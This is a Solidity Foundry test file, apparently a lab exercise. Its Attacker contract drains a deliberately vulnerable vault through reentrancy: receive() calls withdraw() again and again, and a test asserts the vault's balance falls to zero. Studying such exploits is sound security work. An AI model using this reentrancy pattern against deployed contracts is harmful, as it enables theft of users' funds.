// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TestV1} from "../src/vulnerableVault.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    TestV1 private testv1;
    uint256 public attackAmount;
    address owner;

    constructor(TestV1 _testV1){
        testv1 = _testV1;
        owner = msg.sender;
    }

    modifier OnlyOwner{
        require(owner == msg.sender, "Only owner can call function");
        _;
    }
    
    function attack() external payable OnlyOwner {
        require(msg.value > 0, "must send eth");

        attackAmount = msg.value;
        testv1.deposit{value: msg.value}();
        testv1.withdraw(msg.value);
    }


    receive() external payable{
        if (address(testv1).balance >= attackAmount) {
            testv1.withdraw(attackAmount);
        }
    }
}


contract CounterTest is Test {
    TestV1 public testv1;
    Attacker public attacker;
    address user;
    address owner = makeAddr("owner");

    function setUp() public {
        testv1 = new TestV1();
        vm.deal(owner, 1 ether);
        vm.prank(owner);
        attacker = new Attacker(testv1);

        user = makeAddr("user");

        vm.deal(user, 4 ether);
        vm.deal(address(attacker), 4 ether);
        vm.deal(address(testv1), 5 ether);

    }

    function test_withdraw() public{
        vm.startPrank(user);
        uint256 attackerBalanceBefore = user.balance;
        uint256 contractBalanceBefore = address(testv1).balance;
        assertEq(attackerBalanceBefore, 4 ether);
        assertEq(contractBalanceBefore, 5 ether);

        testv1.deposit{value: 3 ether}();
        uint256 attackerBalanceAfter = user.balance;
        uint256 contractBalanceAfter = address(testv1).balance;
        assertEq(attackerBalanceAfter, 1 ether);
        assertEq(contractBalanceAfter, 8 ether);

        testv1.withdraw(3 ether);
        uint256 attackerBalanceAfterWithdraw = user.balance;
        uint256 contractBalanceAfterWithdraw = address(testv1).balance;
        assertEq(attackerBalanceAfterWithdraw, 4 ether);
        assertEq(contractBalanceAfterWithdraw, 5 ether);
        vm.stopPrank();
    }
    

    function test_attack() public{
        vm.startPrank(owner);
        uint256 balanceBeforeAttack = address(attacker).balance;
        uint256 contractBalanceBeforeAttack = address(testv1).balance;
        assertEq(balanceBeforeAttack, 4 ether);
        assertEq(contractBalanceBeforeAttack, 5 ether);

        attacker.attack{value: 1 ether}();

        uint256 balanceAfterAttack = address(attacker).balance;
        uint256 contractBalanceAfterAttack = address(testv1).balance;
        assertEq(balanceAfterAttack, 10 ether);
        assertEq(contractBalanceAfterAttack, 0 ether);
        vm.stopPrank();
    }
}
